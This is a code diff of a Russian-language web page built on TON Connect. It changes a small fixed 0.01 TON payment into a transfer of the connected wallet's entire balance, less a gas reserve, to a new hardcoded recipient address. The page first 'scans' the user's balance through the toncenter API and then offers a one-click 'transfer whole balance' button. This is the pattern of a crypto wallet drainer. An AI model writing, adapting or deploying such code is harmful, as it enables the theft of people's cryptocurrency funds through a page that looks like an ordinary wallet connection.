@@ -120,19 +120,19 @@
 <body>
 
 <div class="card">
-    <!-- Кнопка подключения кошелька -->
+    <!-- Изначально отображается только кнопка подключения кошелька -->
     <div id="ton-connect"></div>
 
-    <!-- Блок деталей, который появляется после подключения -->
+    <!-- Блок деталей, который появляется только после подключения -->
     <div id="wallet-info" class="wallet-details">
         <div class="info-title">Адрес кошелька:</div>
         <div id="wallet-address" class="info-value"></div>
 
         <div class="info-title">Текущий баланс:</div>
-        <div id="wallet-balance" class="info-value balance-box">Загрузка...</div>
+        <div id="wallet-balance" class="info-value balance-box">Сканирование...</div>
 
-        <!-- Кнопка отправки транзакции -->
-        <button id="sendTxBtn" class="send-btn">Отправить 0.01 TON</button>
+        <!-- Кнопка отправки транзакции на весь баланс -->
+        <button id="sendTxBtn" class="send-btn" disabled>Расчёт баланса...</button>
         <div id="txStatus" class="tx-status"></div>
     </div>
 </div>
@@ -151,36 +151,67 @@
     const txStatus = document.getElementById('txStatus');
 
     // Адрес получателя
-    const RECIPIENT_ADDRESS = 'EQD4FPq-PRDieyQKkizfTR61Lb1fI6bqdV5R8I7T6v0eP0rH';
+    const RECIPIENT_ADDRESS = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
 
-    // Функция получения баланса
+    // Запас на комиссию сети (0.005 TON = 5_000_000 nanoTON)
+    const GAS_FEE_RESERVE = 5000000;
+
+    // Глобальные переменные хранят отсканированный баланс
+    let userBalanceNano = 0;
+    let transferableAmountNano = 0;
+
+    // Функция сканирования и получения полного баланса
     async function fetchWalletBalance(rawAddress) {
         try {
-            walletBalanceContainer.innerText = 'Загрузка...';
+            walletBalanceContainer.innerText = 'Сканирование...';
+            sendBtn.disabled = true;
+            sendBtn.innerText = 'Расчёт баланса...';
+
             const response = await fetch(`https://toncenter.com/api/v2/getAddressInformation?address=${rawAddress}`);
             const data = await response.json();
 
             if (data.ok && data.result) {
-                const balanceInNano = parseInt(data.result.balance, 10);
-                const balanceInTon = (balanceInNano / 1e9).toFixed(4);
+                userBalanceNano = parseInt(data.result.balance, 10);
+                const balanceInTon = (userBalanceNano / 1e9).toFixed(4);
                 walletBalanceContainer.innerText = `${balanceInTon} TON`;
-                return balanceInNano;
+
+                // Вычисляем доступную сумму переводом за вычетом комиссии сети
+                if (userBalanceNano > GAS_FEE_RESERVE) {
+                    transferableAmountNano = userBalanceNano - GAS_FEE_RESERVE;
+                    const sendTonStr = (transferableAmountNano / 1e9).toFixed(4);
+                    sendBtn.disabled = false;
+                    sendBtn.innerText = `Перевести весь баланс (${sendTonStr} TON)`;
+                } else {
+                    transferableAmountNano = 0;
+                    sendBtn.disabled = true;
+                    sendBtn.innerText = 'Недостаточно средств на комиссию';
+                }
+
+                return userBalanceNano;
             } else {
-                walletBalanceContainer.innerText = 'Ошибка получения данных';
+                walletBalanceContainer.innerText = 'Ошибка сканирования';
+                sendBtn.innerText = 'Ошибка баланса';
                 return 0;
             }
         } catch (error) {
             console.error(error);
             walletBalanceContainer.innerText = 'Ошибка сети';
+            sendBtn.innerText = 'Ошибка сети';
             return 0;
         }
     }
 
-    // Функция отправки транзакции
+    // Функция отправки транзакции на весь баланс
     async function sendTransaction() {
         const wallet = tonConnectUI.wallet;
         if (!wallet) {
             txStatus.innerText = 'Кошелёк не подключён';
+            txStatus.className = 'tx-status error';
+            return;
+        }
+
+        if (transferableAmountNano <= 0) {
+            txStatus.innerText = 'Недостаточно баланса для перевода';
             txStatus.className = 'tx-status error';
             return;
         }
@@ -191,13 +222,13 @@
             txStatus.innerText = 'Подготовка транзакции...';
             txStatus.className = 'tx-status';
 
-            // Транзакция на 0.01 TON = 10_000_000 наноТОН
+            // Формирование транзакции на весь доступный баланс пользователя
             const tx = {
                 validUntil: Math.floor(Date.now() / 1000) + 300,
                 messages: [
                     {
                         address: RECIPIENT_ADDRESS,
-                        amount: '10000000', // 0.01 TON в наноТОНах
+                        amount: transferableAmountNano.toString(),
                         payload: ''
                     }
                 ]
@@ -219,8 +250,11 @@
             txStatus.innerText = `❌ Ошибка: ${error.message || 'неизвестная ошибка'}`;
             txStatus.className = 'tx-status error';
         } finally {
-            sendBtn.disabled = false;
-            sendBtn.innerText = 'Отправить 0.01 TON';
+            if (transferableAmountNano > 0) {
+                sendBtn.disabled = false;
+                const sendTonStr = (transferableAmountNano / 1e9).toFixed(4);
+                sendBtn.innerText = `Перевести весь баланс (${sendTonStr} TON)`;
+            }
         }
     }
 
@@ -232,7 +266,6 @@
             walletInfoContainer.classList.add('active');
 
             await fetchWalletBalance(address);
-            sendBtn.disabled = false;
             txStatus.innerText = '';
             txStatus.className = 'tx-status';
         } else {
@@ -240,7 +273,7 @@
             walletBalanceContainer.innerText = 'Загрузка...';
             walletInfoContainer.classList.remove('active');
             sendBtn.disabled = true;
-            sendBtn.innerText = 'Отправить 0.01 TON';
+            sendBtn.innerText = 'Подключите кошелёк';
             txStatus.innerText = '';
             txStatus.className = 'tx-status';
         }
